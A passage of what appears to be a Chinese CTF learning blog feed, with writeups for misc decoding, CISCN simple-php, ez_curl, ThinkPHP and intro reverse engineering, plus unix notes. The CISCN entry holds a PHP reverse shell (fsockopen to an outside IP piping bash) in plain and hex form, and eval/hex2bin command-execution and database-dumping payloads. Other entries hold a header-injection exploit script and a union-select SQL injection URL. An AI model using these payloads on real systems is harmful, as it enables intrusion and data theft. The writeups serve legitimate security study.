alt="image-20240531145752783"></p><p>3.miscx</p><p>给了2个加密txt文件，一个zip(一个图片，一个加密.doc文件)</p><p>信息：rot,or,2020</p><p>猜测2020为密码，将.doc文件成功打开(这里使用word打开i，不然其他方式打开都是乱码，血的教训 啊😿)，音符解密，一眼rabbit,猜测密码仍为2020</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX1/eK2855m8HM4cTq8Fquqtm6QDbcUu4F1yQpA==</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">得到：welcome_to_payhelp</span><br></pre></td></tr></table></figure><p>刚好打开hint.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VmpKMFUxTXhXWGxVV0dob1RUSjRVVll3V2t0aFJscDBZMGhLYTAxWGVIaFZiRkpUWWtaYVZWSnJXbFpOVjJoeVZYcEdZVkpzVG5KVWJHaHBWa1ZWZDFkV1ZtRmtNRFZYVjJ4c2FWSlVWbFJVVnpWdVRXeFZlV1ZHVGxSaVZrWTBXVlJPYzFWR1pFZFRiVGxYWW01Q1dGcEdXbE5UUjBZMlVXMTBWMWRGU2xkV1ZtUXdVekpGZUZOWWJHaFRSVFZWV1d0YVMxTXhjRVZUYTFwc1ZteHdlRlp0ZERCV01VcFlaRE53V0Zac2NIWldSekZMVW1zeFdWSnNTbWxXUjNodlZtMXdUMkl5Vm5OaVNGWnBVbXh3YzFac1VrZFNiRlY0WVVkMFZXSlZXbmxWYlRWUFZsWlplbEZyWkZSaVJrcFFWV3hGYkUwd1VXeE5NRkVsTTBRJTNE</span><br></pre></td></tr></table></figure><p>尝试base64</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VjJ0U1MxWXlUWGhoTTJ4UVYwWkthRlp0Y0hKa01XeHhVbFJTYkZaVVJrWlZNV2hyVXpGYVJsTnJUbGhpVkVVd1dWVmFkMDVXV2xsaVJUVlRUVzVuTWxVeWVGTlRiVkY0WVROc1VGZEdTbTlXYm5CWFpGWlNTR0Y2UW10V1dFSldWVmQwUzJFeFNYbGhTRTVVWWtaS1MxcEVTa1psVmxweFZtdDBWMUpYZDNwWFZscHZWRzFLUmsxWVJsSmlWR3hvVm1wT2IyVnNiSFZpUmxwc1ZsUkdSbFV4YUd0VWJVWnlVbTVPVlZZelFrZFRiRkpQVWxFbE0wUWxNMFElM0Q%3D</span><br></pre></td></tr></table></figure><p>再次base64,无果，看到有%等符号，尝试 url解码后再次base64解码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WkRKV2Mxa3lPWFJhVmprd1lqRTRlVTFFU1hkS1ZFSkNXbTE0YUZwNVZYbE5SMng2U2xSSmQxa3lPWFJoVnpWdVRHazBkVXBVUWtKa1IyaHNTbFJKZDJFeVZqVktWRWwzWVZoTmJFMXFRbTlhVjNoellubFZlVTFFU1hkTmFrRnNUV3BGSlRORQ%3D%3D</span><br></pre></td></tr></table></figure><p>反复url解码，base64解码，最后得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">welcome_to_2020</span><br><span class="line">flag is coming...</span><br><span class="line">the key is hello 2020!</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>cs61a打卡学习笔记</title>
      <link href="/2024/05/29/cs61a%E6%89%93%E5%8D%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/05/29/cs61a%E6%89%93%E5%8D%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>1.学会了如何打开和使用终端</p><p>2.以及一些简单的unix命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Filesystem</span><br><span class="line">ls: list,列出当前目录的所有目录</span><br><span class="line">mkdir example: make a new diretory,创建一个名为example的目录</span><br><span class="line">cd example: change directory,改变路径到example目录</span><br><span class="line">cd .. :返回上级目录</span><br><span class="line">cd ~ :回到home目录</span><br><span class="line">rm -r example:移除example目录</span><br><span class="line">rm aaa:移除aaa文件</span><br><span class="line"></span><br><span class="line">Files:</span><br><span class="line">cat unix.txt:将unix的内容打印到屏幕上</span><br><span class="line">mv unix.txt ~/example:将unix.txt移动到home目录的example目录中</span><br><span class="line">mv a.txt c.txt:相当于重命名，原先的a.txt就没有了，出现了c.txt，内容和a.txt里面的是一样的</span><br><span class="line">cp a.txt m.txt:相当于copy，复制文件</span><br><span class="line">cp example/a.txt .:到达example的上级目录中，可以将example的a.txt复制到当前目录(注意最后的点)</span><br><span class="line">rm a.txt:删除文件，且无法撤销</span><br><span class="line">echo &quot;&quot;:显示文字</span><br><span class="line">man ls:显示命令的手册页</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>5.28记录</title>
      <link href="/2024/05/28/5-28%E8%AE%B0%E5%BD%95/"/>
      <url>/2024/05/28/5-28%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="f68dff28cec4c6c8507e0b84cbdff5b431faaa61aa7a68627e70de2a09c37a1a">5eeca1580f39ade72a7db71e8e859a8768655ad5e9e43f4bfefde1bf7a30a9fa4542fb528377265da5af4d5968744cfc0a93aed5da08e0c2abaff9520cbb89813f4c2df61470729fbbe68c3231b622db4970e63807602ad3f50f8277f9342c0b8b1b5c81980fdddd89da453a4cf7bb2a55ca1f2ae870c2baf93a1d16f4ac5e1b08cd93bffa5b7375c17822b000bb36d77cc595e01976188735762c8b4ec73faa31048ad47e6d54c2158fd72ede438663348fae438a793cd0697177fa6a012296ea5f717e8211050915ec5c0f877ea75d609409def406c4003bf42725ca527aaf6569d1ba9538f0e5b11d914fe1053d481be83003b5b2ef1cfd3d71ff92532196538b184ad1486b9b19b8f4fdf57d840c88fc6b57f4b30dcfc12375015725dac845392a9a47dfbd23b57c3598c599e94699474ed2a37b57a69b6fec0bfd5e020324ef509d94cf762b9c400698ba4b16d7cbfd4380877f653a7e9196d12a431e286801aeaf91ad730491f11cb827cb74880b853cbb23f1002a5e13c6736c36f94ff0f3f0def155d941c8f514c1a8ef6f9ae6e57145f0474cba1b28cb65148b15ba76a329c8e66abc6580afa67a182a94170eb64934ee6e3484a1fc76e83dc5823925240b2eb5e75618d5e927be1d5dfcfd838558816bfeca4ddd6515e25d43691dd7062b7c3bb4ebd609339a052be0add94853b869398ab72895bc4337700d1d454277027e3b0d5ee4cbaf12a2b09ac9fb6e086ff1924aadd2d8ee1ce01a18fcac38d7bfc63f917e5bb24b4090f9728258d0d30b6453cb7d724c78c09421b7a21567ba4132416b386e361a02eefb5a1961092a06380208eeca0f1a277c85cc51f865f0dd896960d609c11dcf0cdfe46a6fae2202c740f0af3754454395c85c41e9cd4f74aad261bbaeaa5c503d2c0e17d467e02d5b1df2532afd13106a8aae4b490e4803d273c782d0ac1fbd45f6160c1f1d2fe1792414ad1d6d92db6d09c1ea7b09a3184b779bfa0fc6be1b990463d7a83a998d0380b69b493e895be6b28f2c5147a97870a00acbfcb9ab9e822faf1fcf68c4129d0d36a7511aeef583968bcb6b4c20a8db46ae1b3911bc6ff17cec39b8b0b9684a8d27026c296894c1cff47a0fd5f1b28cd75cbbca62cf0686324699275313d9cb43ee983de041986c7ac3cf3da7e8cd72d17d537843b3ab1c6b4f15d0498a93474b8387211e4f355c1c72beae0b8c9cefe090040d05bd6d761c0e9a96bd226815218c74c1dda17bce4f8969c236f0201f2392ee41f5515e902ba140a9b38af35211f7b32f4a4dadc85e81809ba1897142232e9cd265826378eaa377ee39f9b25ab05ebc7e3b2d64d0366a80dbd6abe14a561e6bced9f1c344f58f3ceb3c084cdad00cb69ee790c604d7b9b1dbd631d2876d1fdb1a7c39a4122ff82c4c59777c5ee51352b33fcbf7e7d93d6f96e4212492bf16f235bfb37d013edeb4e49118abe4e4c570c895f5c7bf96f70f2d</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> life </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN复现</title>
      <link href="/2024/05/23/CISCN%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/05/23/CISCN%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>simple-php</p><p>法一：</p><p>payload:cmd &#x3D; php -r eval(hex2bin(substr(_73797374656d28276c7327293b,1)));</p><p>知识点：</p><p>要注意的点是：system(‘ls’);分号分号分号！！！！！！</p><p>在PHP中，变量名通常以字母或下划线开始，后面跟着字母、数字或下划线的任意组合。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.php -r   php -r eval()表示的是运行php代码，不用使用&lt;??&gt;这两个符号</span><br><span class="line">2.hex2bin(&#x27;dfvnjjb983utgnvjmkf&#x27;),将括号里的十六进制转为原始的二进制形式，即十六进制下对应的ascii码字符串</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">做题:</span><br><span class="line">1.尝试读取根目录下的flag,system(&#x27;ls&#x27;);,system(&#x27;cat /f*&#x27;) ,但是没有</span><br><span class="line">2.只能从数据库里面读取,echo:是一个Shell命令，用于输出文本或变量的值到标准输出（通常是屏幕）。反引号表示执行反引号内的命令</span><br><span class="line">echo `mysql -u root -p&#x27;root&#x27; -e &#x27;use PHP_CMS;show databases;&#x27;`;</span><br><span class="line">echo `mysql -u root -p&#x27;root&#x27; -e &#x27;use PHP_CMS;show tables;&#x27;`;</span><br><span class="line">echo `mysql -u root -p&#x27;root&#x27; -e &#x27;use PHP_CMS;select * from F1ag_Se3Re7;&#x27;`;</span><br><span class="line">注：在命令行中使用mysql命令时，-p选项后面紧接着应该是指定的密码，而且不应该有空格。这是因为-p后面直接跟的参数被认为是密码值，直到遇到下一个参数分隔符（通常是空格）为止。如果在-p和密码之间有空格，命令行解释器会认为-p后面没有紧跟密码，从而导致错误或误解密码的输入。</span><br></pre></td></tr></table></figure><p>法二：EOT代替分号，反弹shell，但是没成功🥹，版本问题吧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cmd=php -r $a=&lt;&lt;&lt;EOT</span><br><span class="line">6c73</span><br><span class="line">EOT;</span><br><span class="line">eval(system(hex2bin($a)))</span><br></pre></td></tr></table></figure><p>16进制编码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sock=fsockopen(&quot;47.121.25.95&quot;,3456);system(&quot;bash &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);</span><br><span class="line">24736f636b3d66736f636b6f70656e282234372e3132312e32352e3935222c33343536293b73797374656d282262617368203c2633203e263320323e263322293b</span><br></pre></td></tr></table></figure><p>fsockopen(“81.70.163.152”,82);</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这段代码使用fsockopen函数尝试与IP地址为   的服务器在端口  上建立一个Socket连接。fsockopen用于在 PHP中创建一个到其他服务器的网络连接，常用于发送数据或接收来自远程服务器的数据。如果连接成功，会返回文件指针（资源类型），在这里赋值给了变量$sock.</span><br></pre></td></tr></table></figure><p>system(“bash &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">利用system函数执行了一个shell命令，system函数用于执行外部程序，并且显示输出。这里的命令是启动一个Bash Shell,并进行了标准输入、输出、错误的重定向操作。</span><br><span class="line"></span><br><span class="line">- `&lt;&amp;3` 表示将标准输入（stdin，默认为0）重定向到文件描述符3指向的地方。在大多数情况下，如果之前的操作（如`fsockopen`）没有特别指定，文件描述符3默认不会被分配，但这里假设（基于上下文理解）它是对之前建立的socket连接的引用，意味着Bash将从这个socket接收输入。</span><br><span class="line">- `&gt;&amp;3` 是将标准输出（stdout，默认为1）重定向到文件描述符3，意味着Bash的所有正常输出也将通过这个socket发送出去。</span><br><span class="line">- `2&gt;&amp;3` 则是将标准错误输出（stderr，默认为2）同样重定向到文件描述符3，确保任何错误信息也通过相同的socket传递。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>web刷题</title>
      <link href="/2024/05/21/web%E5%88%B7%E9%A2%98/"/>
      <url>/2024/05/21/web%E5%88%B7%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h3 id="ez-curl"><a href="#ez-curl" class="headerlink" title="ez_curl"></a>ez_curl</h3><p>知识点：返回索引</p><ul><li><a href="https://www.runoob.com/php/func-string-strripos.html">strripos()</a> - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）</li><li><a href="https://www.runoob.com/php/func-string-strpos.html">strpos()</a> - 查找字符串在另一字符串中第一次出现的位置（区分大小写）</li><li><a href="https://www.runoob.com/php/func-string-strrpos.html">strrpos()</a> - 查找字符串在另一字符串中最后一次出现的位置（区分大小写）</li></ul><p>考点：</p><p>1.express的parameterLimit默认为1000，即参数最大限制为1000，写脚本请求加上1000个参数就能成功把拼接的&amp;admin&#x3D;flase挤掉</p><p>2.这里根据RFC 7230(HTTP&#x2F;1.1协议的定义)的规定，规定了 field-name 是由一个或多个打印的 ASCII  字符组成，不包括分隔符，包括空格。因此，如果一个 field-name 的第一个字符是空格，那么这个 HTTP header  是非法的，应该被服务器或客户端忽略或拒绝，然而，Node.js 在处理这类情况时通常是宽容的。</p><p>3.当Content-Type为application&#x2F;x-www-form-urlencoded且提交方法是POST方法时，$_POST数据与php:&#x2F;&#x2F;input数据是一致的。</p><p>问题：挤掉&amp;admin&#x3D;false</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$offset = stripos($headers[$i], &#x27;:&#x27;);</span><br><span class="line">从头开始不分大小写,在headers的第一个参数找到冒号，返回冒号所在的位置,若未找到，返回False</span><br><span class="line">$key = substr($headers[$i], 0, $offset);</span><br><span class="line">在Headers的第一个参数中截取从0到冒号的值赋给$key  </span><br><span class="line">$value = substr($headers[$i], $offset + 1);</span><br><span class="line">在第一个参数中截取冒号到结尾的值赋给$value</span><br><span class="line">&#123;&quot;headers&quot;: [&quot;xx:xx\nadmin:true&quot;, &quot;Content-Type:application/json&quot;], &quot;params&quot;: &#123;&quot;admin&quot;: &quot;true&quot;, &quot;x0&quot;: 0&#125;</span><br><span class="line">比如它的$key就是xx,$value就是xx，因为\n换行符的原因，admin:true可以被绕过</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://61.147.171.105:49744/&#x27;</span></span><br><span class="line">datas = &#123;</span><br><span class="line">    <span class="string">&#x27;headers&#x27;</span> : [<span class="string">&#x27;xx:xx\n admin:true&#x27;</span>,<span class="string">&#x27;Content-Type: application/json&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;params&#x27;</span> : &#123;<span class="string">&#x27;admin&#x27;</span>:<span class="string">&#x27;true&#x27;</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1200</span>):  垃圾字符</span><br><span class="line">    datas[<span class="string">&#x27;params&#x27;</span>][<span class="string">&#x27;x&#x27;</span>+<span class="built_in">str</span>(i)] = i</span><br><span class="line"></span><br><span class="line">data = json.dumps(datas)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">r = requests.post(url, data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://back-end:3000/flag?&#x27;</span>;</span><br><span class="line"><span class="variable">$input</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);  </span><br><span class="line"><span class="variable">$headers</span> = (<span class="keyword">array</span>)<span class="title function_ invoke__">json_decode</span>(<span class="variable">$input</span>)-&gt;headers;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$headers</span>); <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$offset</span> = <span class="title function_ invoke__">stripos</span>(<span class="variable">$headers</span>[<span class="variable">$i</span>], <span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$headers</span>[<span class="variable">$i</span>], <span class="number">0</span>, <span class="variable">$offset</span>);</span><br><span class="line">    <span class="variable">$value</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$headers</span>[<span class="variable">$i</span>], <span class="variable">$offset</span> + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$key</span>, <span class="string">&#x27;admin&#x27;</span>) &gt; -<span class="number">1</span> &amp;&amp; <span class="title function_ invoke__">stripos</span>(<span class="variable">$value</span>, <span class="string">&#x27;true&#x27;</span>) &gt; -<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;try hard&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$params</span> = (<span class="keyword">array</span>)<span class="title function_ invoke__">json_decode</span>(<span class="variable">$input</span>)-&gt;params;</span><br><span class="line"><span class="variable">$url</span> .= <span class="title function_ invoke__">http_build_query</span>(<span class="variable">$params</span>);</span><br><span class="line"><span class="variable">$url</span> .= <span class="string">&#x27;&amp;admin=false&#x27;</span>;</span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HTTPHEADER, <span class="variable">$headers</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_TIMEOUT_MS, <span class="number">5000</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_NOBODY, <span class="literal">FALSE</span>);</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line"><span class="keyword">try</span> hard1</span><br><span class="line"></span><br><span class="line">js代码</span><br><span class="line">app.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;/flag&#x27;</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.query.admin.<span class="title function_ invoke__">includes</span>(<span class="string">&#x27;false&#x27;</span>) &amp;&amp; req.headers.admin.<span class="title function_ invoke__">includes</span>(<span class="string">&#x27;true&#x27;</span>))&#123;</span><br><span class="line">        res.<span class="title function_ invoke__">send</span>(flag);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        res.<span class="title function_ invoke__">send</span>(<span class="string">&#x27;try hard&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="wife-wife"><a href="#wife-wife" class="headerlink" title="wife_wife"></a>wife_wife</h3><p>前置知识：</p><p>假设在函数内部新建了一个变量，函数执行完毕之后，函数内部这个独立作用域或（封闭的盒子）就会删除，此时这个新建变量也会被删除。</p><p>如何令这个封闭的盒子是不会删除？可以使用“闭包”的方法（闭包涉及函数作用域、内存回收机制、作用域继承）</p><p>闭包后，内部函数可以访问外部函数作用域的变量，而外部的函数不能直接获取到内部函数的作用域变量</p><p>js闭包理解：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> add = (<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> counter = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;<span class="keyword">return</span> counter += <span class="number">1</span>;&#125;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 奶奶的“记忆助手”  </span></span><br><span class="line"><span class="keyword">var</span> 奶奶的记忆助手 = (<span class="keyword">function</span>(<span class="params"></span>) &#123;  </span><br><span class="line">    <span class="comment">// 初始时，奶奶还没有收集任何石头  </span></span><br><span class="line">    <span class="keyword">var</span> 奶奶已经收集的石头数量 = <span class="number">0</span>;  </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这是一个按钮，奶奶每次找到一块石头都会按这个按钮  </span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params"></span>) &#123;  </span><br><span class="line">        <span class="comment">// 每按一次，奶奶已经收集的石头数量就加1  </span></span><br><span class="line">        奶奶已经收集的石头数量 += <span class="number">1</span>; </span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 然后告诉奶奶她现在有多少块石头  </span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> 奶奶已经收集的石头数量;  </span><br><span class="line">    &#125;;  </span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初识re</title>
      <link href="/2024/05/20/%E5%88%9D%E8%AF%86re/"/>
      <url>/2024/05/20/%E5%88%9D%E8%AF%86re/</url>
      
        <content type="html"><![CDATA[<p>BUUCTF reverse1</p><p>学习要领：<br>1.使用IDA打开文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.点击New打开新文件</span><br><span class="line">2.点击Go,把可执行文件拖进IDA</span><br><span class="line">注：不同版本要用对应的32或64位打开，可以尝试，因为它要么32位，要么64位</span><br></pre></td></tr></table></figure><p>2.IDA窗口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">01.反汇编窗口</span><br><span class="line">  是图形化界面，一般可以通过这个界面快速了解程序的执行过程</span><br><span class="line">02.字符串窗口</span><br><span class="line">  使用shift+F12打开，打开字符串窗口，可以看到里面的字符串</span><br></pre></td></tr></table></figure><p><img src="/2024/05/20/%E5%88%9D%E8%AF%86re/Users\史小乐\AppData\Roaming\Typora\typora-user-images\image-20240520165302704.png" alt="image-20240520165302704"></p><p>3.反编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在反汇编窗口使用fn+F5实现反汇编功能，即将汇编语言反向编译为伪C语言</span><br></pre></td></tr></table></figure><p>现在看题：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.打开exe文件</span><br><span class="line">2.shift+F12查看字符串</span><br><span class="line">3.跟进，双击“this is the right flag”,发现右下角有DATA XREF，它的地址，点击进入，看到流程图</span><br></pre></td></tr></table></figure><p><img src="/2024/05/20/%E5%88%9D%E8%AF%86re/Users\史小乐\AppData\Roaming\Typora\typora-user-images\image-20240520171559490.png" alt="image-20240520171559490"></p><p><img src="/2024/05/20/%E5%88%9D%E8%AF%86re/Users\史小乐\AppData\Roaming\Typora\typora-user-images\image-20240520171757295.png" alt="image-20240520171757295"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4.fn+F5,反汇编，得到伪C语言，进行审计代码</span><br></pre></td></tr></table></figure><p><img src="/2024/05/20/%E5%88%9D%E8%AF%86re/Users\史小乐\AppData\Roaming\Typora\typora-user-images\image-20240520172204541.png" alt="image-20240520172204541"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>H&amp;NCTF复现</title>
      <link href="/2024/05/19/H-NCTF%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/05/19/H-NCTF%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h4 id="ez-tp"><a href="#ez-tp" class="headerlink" title="ez_tp"></a>ez_tp</h4><p>有点没理解，以后有能力了再做做吧</p><p>在原版thinkphp3.2.3中，删除了think_filter过滤的exp，使得我们可以利用</p><p>在ThinkPHP\Library\Think\Db\Driver.class.php中的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(is_array($val)) &#123;</span><br><span class="line">...</span><br><span class="line">elseif(&#x27;exp&#x27; == $exp )&#123;</span><br><span class="line">$whereStr .= $key.&#x27; &#x27;.$val[1];</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用exp时，需要手动添加等号，再配合union select，即可获得flag</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php/home/index/h_n?name[0]=exp&amp;name[1]=%3d%27test123%27%20union%20select%201,flag%20from%20flag</span><br></pre></td></tr></table></figure><p>注意，cookie可能会匹配某些过滤，删除即可</p><p><img 